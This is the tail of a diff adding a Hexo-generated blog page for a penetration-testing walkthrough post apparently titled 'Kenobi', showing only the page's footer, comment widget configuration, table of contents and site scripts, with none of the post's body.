+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2024/05/11/Kenobi/" class="leancloud-visitors view" data-flag-title="Kenobbi">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2024/06/24/CISCN2024华中赛区选拔赛/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/04/20/D-Link DIR-815 路由器多次栈溢出漏洞复现 (CNVD-2013-11625)/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"QrmzEeS3e4xvmJxO1dSPlkW4-gzGzoHsz","appKey":"ov6uvwKnDQmJxtpeS0wvBIwL","placeholder":"","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-05-11 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/进攻性渗透测试/">进攻性渗透测试<span>5</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/渗透打靶/">渗透打靶<span>3</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%B3%84%E9%9C%B2"><span class="toc-article-text">泄露</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%85%A5%E4%BE%B5"><span class="toc-article-text">入侵</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-article-text">提权</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 X1NRI's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
